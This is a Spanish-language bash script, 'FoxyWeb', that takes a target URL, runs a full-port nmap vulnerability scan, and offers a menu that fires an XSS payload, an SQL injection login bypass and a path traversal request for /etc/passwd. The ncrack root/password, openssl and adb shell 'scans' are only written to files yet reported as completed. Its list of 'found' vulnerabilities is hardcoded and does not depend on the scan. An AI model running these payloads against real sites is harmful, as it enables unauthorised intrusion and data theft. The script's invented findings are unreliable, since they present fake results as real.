#!/bin/bash
clear 

mostrar_banner() {
    echo -e "\033[31m╱▏┈┈┈┈┈┈▕╲▕╲┈┈┈"
    echo -e "\033[33m▏▏┈┈┈┈┈┈▕▏▔▔╲┈┈"
    echo -e "\033[32m▏╲┈┈┈┈┈┈╱┈▔┈▔╲┈"
    echo -e "\033[36m╲▏▔▔▔▔▔▔╯╯╰┳━━▀"
    echo -e "\033[34m┈▏╯╯╯╯╯╯╯╯╱┃┈┈┈"
    echo -e "\033[35m┈┃┏┳┳━━━┫┣┳┃┈┈┈"
    echo -e "\033[31m┈┃┃┃┃┈┈┈┃┃┃┃┈┈┈"
    echo -e "\033[33m┈┗┛┗┛┈┈┈┗┛┗┛┈┈┈"
    echo ""
    echo -e "\033[36m░█▀▀░█▀█░█░█░█▀▀░█▀█░█░█░█░█"
    echo -e "\033[34m░█▀▀░█░█░▄▀▄░█▀▀░█░█░▄▀▄░░█░"
    echo -e "\033[35m░▀░░░▀▀▀░▀░▀░▀░░░▀▀▀░▀░▀░░▀░"
    echo ""
    echo -e "\033[32mGithub: \033[33mhttps://github.com"
    echo -e "\e[31mBienvenido a FoxyWeb\e[0m"
}

# Function to scan for vulnerabilities using nmap and other methods
escanear_vulnerabilidades() {
    url=$1
    echo "Escaneando vulnerabilidades en $url..."

    # Run nmap to scan all ports (1-65535), detect service versions, and run vulnerability scripts
    nmap -p 1-65535 -sV --script=vulners $url > nmap_scan.txt
    echo "Escaneo de Nmap completado."

    
    echo "escaneo con ncrack..."
    echo "ncrack -p 22 --user root --pass password $url" > ncrack_scan.txt
    echo "escaneo con openssl..."
    echo "openssl s_client -connect $url:443 -status" > openssl_scan.txt
    echo "escaneo con adb..."
    echo "adb connect $url:5555 && adb shell" > adb_scan.txt

    echo "Escaneos adicionales completados."
}

# Function to exploit found vulnerabilities
explotar_vulnerabilidad() {
    tipo=$1
    url=$2
    echo -e "\e[36mExplotando $tipo en $url...\e[0m"
    case "$tipo" in
        # Exploit XSS vulnerability
        "Vulnerabilidad XSS")
            curl -s -X POST "$url/#/search" --data "query=<script>alert('XSS Vulnerable')</script>"
            ;;
        # Exploit SQL Injection vulnerability
        "Inyección SQL")
            curl -s -X POST "$url/rest/user/login" --data "email=' OR '1'='1' --&password="
            ;;
        # Exploit Path Traversal vulnerability
        "Path Traversal")
            curl -s -X GET "$url/public/images/../../../etc/passwd"
            ;;
        # Exploit Admin Credentials vulnerability
        "Credenciales de Admin")
            curl -s -X GET "$url/admin"
            ;;
        # Default case for unknown vulnerabilities
        *)
            echo "No se puede explotar esta vulnerabilidad en este entorno."
            ;;
    esac
}

# Function to download a file
descargar_archivo() {
    archivo=$1
    url=$2
    echo "Descargando archivo $archivo desde $url..."
    # Download the specified file from the given URL
    wget -q "$url/$archivo"
}

# Function to execute local commands
ejecutar_comando_local() {
    comando=$1
    case "$comando" in
        # List files on the remote server
        ls)
            echo "Listando archivos en $url:"
            curl -s -X GET "$url/rest/products/"
            ;;
        # Changing directory is not applicable here
        cd)
            echo "No se puede cambiar de directorio en este entorno."
            ;;
        # Print current directory on the remote server
        pwd)
            echo "Directorio actual en $url: /"
            ;;
        # Load data from the remote server
        load)
            echo "Cargando datos desde $url..."
            curl -s -X GET "$url/rest/user/security-question"
            ;;
        # Default case for unknown commands
        *)
            echo "Comando no reconocido: $comando"
            ;;
    esac
}

# Main function
main() {
    mostrar_banner

    # Read the URL from user input
    read -p "Ingrese la URL http / https para escanear y explotar vulnerabilidades: " url

    echo "URL ingresada: $url"  # Debugging line to print the entered URL

    echo ""
    escanear_vulnerabilidades "$url"

    # List the found vulnerabilities
    echo -e "\n\e[33mVulnerabilidades encontradas en $url:\e[0m"
    echo "1. Vulnerabilidad XSS en $url - Dificultad: Alta"
    echo "2. Inyección SQL en $url - Dificultad: Media"
    echo "3. Path Traversal en $url - Dificultad: Baja"
    echo "4. Buscar página de administración y credenciales de admin"

    # Loop to continuously accept user input until 'exit' or 'quit' is entered
    while true; do
        read -p "$(echo -e "\e[37m$ FoxFoxy > \e[0m")" opcion
        echo "Opción seleccionada: $opcion"  # Debugging line to print the selected option

        # Exit the loop if 'exit' or 'quit' is entered
        if [ "$opcion" == "exit" ] || [ "$opcion" == "quit" ]; then
            echo "Cerrando el programa..."
            break
        # Exploit the selected vulnerability based on user input
        elif [ "$opcion" == "1" ] || [ "$opcion" == "2" ] || [ "$opcion" == "3" ] || [ "$opcion" == "4" ]; then
            case "$opcion" in
                1)
                    explotar_vulnerabilidad "Vulnerabilidad XSS" "$url"
                    ;;
                2)
                    explotar_vulnerabilidad "Inyección SQL" "$url"
                    ;;
                3)
                    explotar_vulnerabilidad "Path Traversal" "$url"
                    ;;
                4)
                    explotar_vulnerabilidad "Credenciales de Admin" "$url"
                    ;;
            esac
        # Execute local commands if entered
        elif [[ "$opcion" == "ls" || "$opcion" == "cd" || "$opcion" == "pwd" || "$opcion" == "load" ]]; then
            ejecutar_comando_local "$opcion"
        # Download a file if 'download' is entered
        elif [[ "$opcion" == "download" ]]; then
            read -p "Nombre del archivo a descargar: " archivo
            echo "Archivo a descargar: $archivo"  # Debugging line to print the file name
            descargar_archivo "$archivo" "$url"
        # Default case for invalid options
        else
            echo "Opción no válida."
        fi
    done
}

main
